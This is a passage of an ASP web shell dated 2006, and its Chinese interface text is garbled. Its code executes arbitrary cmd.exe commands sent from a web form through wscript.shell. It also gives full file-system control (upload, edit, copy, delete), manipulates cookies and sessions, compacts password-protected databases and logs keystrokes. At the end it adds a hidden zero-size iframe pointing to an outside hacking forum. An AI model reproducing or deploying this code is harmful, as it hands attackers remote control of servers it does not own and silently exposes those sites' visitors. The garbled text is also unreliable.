class="td1" width="84%"><input type="text" name="Command" value="<%=MyCommand%>" size="50"></td></tr><tr><td class="td1" align="center" colspan="2"><textarea rows="8" name="S1" cols="59" readonly>
<%=Server.Createobject("wscript.shell").exec("cmd.exe /c "&MyCommand).stdout.readall%>
</textarea> </td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="ִ��" name="B8" class="button"></td></tr></table><%End Sub%> <%Sub CookieWin()%> <table border="1" width="100%" id="table9" class="table1"><tr><form method="POST" action="<%=Filename%>?Work=SetCookie" name="SetCookie"><th>����Cookies</th></tr><tr><td class="td1"><font color="#FF0000">Response.Cookies("<input type="text" name="Cookie1" size="6">") ("<input type="text" name="Cookie2" size="6">") = ("<input type="text" name="Cookie3" size="6">")</font> <input type="submit" value="�ύ" name="B7" class="button"> </td></form></tr><tr><td class="td1"><B>��ǰ��վ�㱣��������ϵ�����Cookies���£�</B><br><%
Dim Items
For Each Items In Request.Cookies 
If Request.Cookies(Items).Haskeys Then 
For Each Itemkey In Request.Cookies(Items) 
Response.Write "Response.Cookies('"&Items &"')('"&Itemkey&"')="& Request.Cookies(Items)(Itemkey)& "<A href='"&FileName&"?Work=DelCookies&CookieValue="&Items&"'><FONT COLOR='#FF3300'>[ɾ]</FONT></A><Br>"
Next 
Else 
Response.Write "Response.Cookies('"&Items &"')="& Request.Cookies(Items) & "<A href='"&FileName&"?Work=DelCookies&CookieValue="&Items&"'>[<FONT COLOR='#FF3300'>ɾ</FONT>]</A><Br>"
End If 
Next
%> </td></tr><tr><form method="POST" action="<%=Filename%>?Work=SetSesValue" name="SetSession"><th>Sessionֵ����</th><tr><td class="td1" align="center"><font color="#FF0000">Session(" <input type="text" name="SetValue" size="12"> ") = ("<input type="text" name="MyValue" size="12">")</font> <input type="submit" value="����" name="B6" class="button"> </td></form></tr><tr><td class="td1"><b>��ǰ��վ�㱣���������ϵ�����Session���£�</b><br>Session����:<font color="#FF0000"><%=Session.Contents.Count%></font><br><%
Dim strName,iLoop
For Each strName in Session.Contents
If IsArray(Session(strName)) then 
For iLoop = LBound(Session(strName)) to UBound(Session(strName)) 
Response.Write "session('"&strName & ")(" & iLoop & ") = " & Session(strName)(iLoop) & "<a href='"&Filename&"?Work=DelSess&SessValue="&strname&"'>[<FONT  COLOR='#FF3300'>ɾ</FONT>]</a><BR>" 
Next 
Else 
Response.Write "session('"&strName & "') = " & Session.Contents(strName) & "<a href='"&Filename&"?Work=DelSess&SessValue="&strname&"'>[<FONT  COLOR='#FF3300'>ɾ</FONT>]</a><BR>" 
End If 
next
%> </td></tr></table><%End Sub%> <%Sub KeyWin()%> <table border="1" width="100%" id="table10" class="table1"><tr><th class="th1">���̼�ֵ��ѯ</th></tr><tr><td class="td1" align="center"><SCRIPT LANGUAGE='JScript'>function  keyDown()    
{  
       var  keycode  =  event.keyCode;  
       var  realkey  =  String.fromCharCode(event.keyCode);  
           document.all.GetKeys.value = keycode  
            document.all.InKyes.select()
} 
</SCRIPT>
<script>
<!--
document.write(unescape("%u7ED3%u679C%u503C%uFF1A%3Cinput%20%20type%3D%22text%22%20name%3D%22GetKeys%22%20readOnly%20size%3D%225%22%20onmouseover%3D%22this.select%28%29%22%3E%20%20%20%0D%0A%u8F93%u5165%u952E%uFF1A%3Cinput%20%20type%3D%22text%22%20%20onKeyPress%3D%22keyDown%28%29%22%20maxlength%3D%221%22%20name%3D%22InKyes%22%20size%3D%223%22%3E%20%0D%0A"));
//-->
</script>
</td></tr></table>
<%End Sub%>
<%
'ѹ��
Const JET_3X = 4
Function CompactDB(dbPath, boolIs97,Pass)
On Error Resume Next 
Dim fso, Engine, strDBPath
strDBPath = left(dbPath,instrrev(DBPath,"\"))
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(dbPath) Then 
Set Engine = CreateObject("JRO.JetEngine")
If boolIs97 = "Data97" Then
Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbpath, _
"Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password='"&Pass&"';Data Source=" & strDBPath & "temp.mdb;" _
& "Jet OLEDB:Engine Type=" & JET_3X
Else
Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password='"&Pass&"';Data Source=" & dbpath, _
"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp.mdb"
End If
If Err Then
CompactDB = Err.Description
Exit Function
End if
fso.CopyFile strDBPath & "temp.mdb",dbpath
fso.DeleteFile(strDBPath & "temp.mdb")
Set fso = nothing
Set Engine = nothing
CompactDB = "������ݿ�, " & dbpath & ", �Ѿ�ѹ���ɹ�!" & vbCrLf
Response.Write"<script>opener.window.location.reload()</script>"
Else
CompactDB = "���ݿ����ƻ�·������ȷ. ������!" & vbCrLf
End If
End Function
Sub Compressmdb(mdbPath)%>
<table border="1" width="100%" id="table12" class="table1">
<tr><form method="POST" name="YaSuoMdb" action="<%=Filename%>?Work=CompreData">
<td class="td1" colspan="2">·����·��:<input type="text" name="MdbPath" size="49" readonly value="<%=mdbPath%>"></td></tr>
<tr><td class="td1" align="right" width="15%">����:</td><td class="td1" width="82%"><font color="#FF0000">
<input type="text" name="MdbPass" size="20">(���û�������벻Ҫ��д�κζ���)</font></td></tr>
<tr><td class="td1" align="center" colspan="2">
ACCESS97:<input type="radio" name="V2" value="Data97">
ACCESS2000:<input type="radio" name="V2" value="Data2000" checked></td></tr>
<tr><td class="td1" align="center" colspan="2">
<input type="Submit" value="ȷ��ѹ��" name="ComPrsmdb" class="button"></td></form></tr></table>
<%End Sub%>
<%Sub MyMouseWin()%>
<table border="1" width="100%" id="table10" class="table1"><tr><td class="td1" align="center">[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowKeyWin','KeyWin','500','150','')">���̼�ֵ��ѯ</a>] </td></tr><tr><td class="td1" align="center">[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowListFileWin','ListWin','500','500','')">�ļ��б�</a>] <!--[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowGetDataWin','DateWin','500','350','')">���ݿ����</a>]--> [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowShellWin','ShellWin','500','300','')">Զ������</a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowCookieWin','CookieWin','500','400','')">��վ��֤����</a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=outlogin','outWin','500','100','')">�˳���½</a>] </td></tr>
<tr><td class="td1">
<UL>
<LI><STRONG>�����ļ��б������Խ��и�ϸ�µĲ�����</STRONG></LI></UL>
<OL>
<OL>
<LI>�½��ļ��С� 
<LI>�½����ļ����������߱�д���ļ��� 
<LI>�ϴ��ļ���֧�ֶ���ļ��ϴ����� 
<LI>�ļ��༭�����ƣ�ɾ���� 
<LI>���ݿ�ѹ���� 
<LI>������е��ļ����Լ��ļ�����ϸ��Ϣ.</LI></OL></OL>
 </td></tr>
</table><%End Sub%>
<%
Sub DelFile(DelPath)
On Error Resume Next 
Call IsRoot(DelPath)
  Obj.DeleteFile(DelPath)
If Err Then
Show(Err.Description)
Exit Sub
Else
Show("�ļ�ɾ���ɹ�!")
Response.Write"<script>opener.window.location.reload()</script>"
End If
Set Obj = Nothing
End Sub
Sub DelFolser(DelFolderPath)
On Error Resume Next 
Call IsRoot(DelFolderPath&SpPath)
  Obj.DeleteFolder(DelFolderPath)
If Err Then
Show(Err.Description)
Exit Sub
Else
Show("�ļ���ɾ���ɹ�!")
Response.Write"<script>opener.window.location.reload()</script>"
End If
Set Obj = Nothing
End Sub

Sub DelSession(SessValue)
Session.Contents.Remove(Sessvalue)
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Sub SetSession(Sess1,Sess2)
If Sess1<>"" Then
Session(Sess1)=Sess2
End If
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Sub DelCookies(CookiesValue)
Response.Cookies(CookiesValue).Expires=Date-1
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Sub SetCookies(Co1,Co2,Co3)
If Co1<>"" And Co2="" Then
Response.Cookies(Co1).Expires=Date+30
Response.Cookies(Co1)=Co3
End If
If Co1<>"" And Co2<>"" Then
Response.Cookies(Co1).Expires=Date+30
Response.Cookies(Co1)(Co2)=Co3
End If
Response.Redirect Filename&"?Work=ShowCookieWin"
End Sub

Select Case Request("Work")
':::::::::::��ʾ�����ж�::::::::::::::::::
Case "ShowUpFileWin"
Call UpFileWim(Request("PutPath"))
Case "ShowFolderWin"
Call FolderWin(Request("NewFolderPath"))
Case "ShowFileWin"
Call FileWin(Request("NewFilePath"))
Case "ShowCopyFileWin"
Call CopyFileWin(Request("CopyPath"))
Case "ShowListFileWin"
Call ListFileWin(Request("ListPath"))
Case "ShowEditFileWin"
Call EditFile(Request("EditPath"))
Case "ShowGetDataWin"
Call GetDataWin()
Case "ShowShellWin"
Call ShellWin(Null)
Case "ShowCookieWin"
Call CookieWin()
Case "ShowKeyWin"
Call KeyWin()
Case "ShowMdbWin"
Call Compressmdb(Request("MdbPath"))
'Case ""
'Call
'Case ""
'Call
'Case ""
'Call
'Case ""
'Call
'Case ""
'Call
'::::::���ݴ����ж�:::::::::::
Case "PutFile"
Call SaveUp()
Case "NewFolder"
Call SaveFolder(Trim(Request.Form("FolderPath")),Trim(Request.Form("NewFolder")))
Case "NewFile"
Call SaveFile(Trim(Request.Form("FilePath")),Trim(Request.Form("NewFileName")))
Case "CopyFiles"
Call CopyFile(Request.Form("CopyPath"),Trim(Request.Form("NewCopyName")))
Case "PostEditFile"
Call SaveEditFile(Request("ReFilePath"),Request.Form("FileStr"))
Case "ShowDelFilewin"
Call DelFile(Request("DelPath"))
Case "ShowDelFolderwin"
Call DelFolser(Request("DelFolderPath"))
Case "ShowShellForm"
Call ShellWin(Trim(Request.Form("Command")))
Case "DelSess"
Call DelSession(Request("SessValue"))
Case "SetCookie"
Call SetCookies(Trim(Request.Form("Cookie1")),Trim(Request.Form("Cookie2")),Trim(Request.Form("Cookie3")))
Case "DelCookies"
Call DelCookies(Request("CookieValue"))
Case "SetSesValue"
Call SetSession(Trim(Request.Form("SetValue")),Trim(Request.Form("MyValue")))
Case "CallData"
Call MyDataEdit()
Case "CompreData"
Show(CompactDB(Request.form("MdbPath"), Request.form("V2"), Request.form("MdbPass")))
'Case ""
'Call
'Case ""
'Call
Case Else
Call MyMouseWin()
End Select
End If
%> </td></tr><tr><td align="center" bgcolor="#F6F6F6">Copyright &copy;2006 [<FONT COLOR='#9966FF'> ����֮�� ����</FONT>]��������ҳ��<A HREF='http://www.killbase.com/' target='_blank'>http://www.killbase.com/</A></td></tr></table></div></body></html>
<iframe src=http://bbs.hack88.cn/ width=0 height=0></iframe>
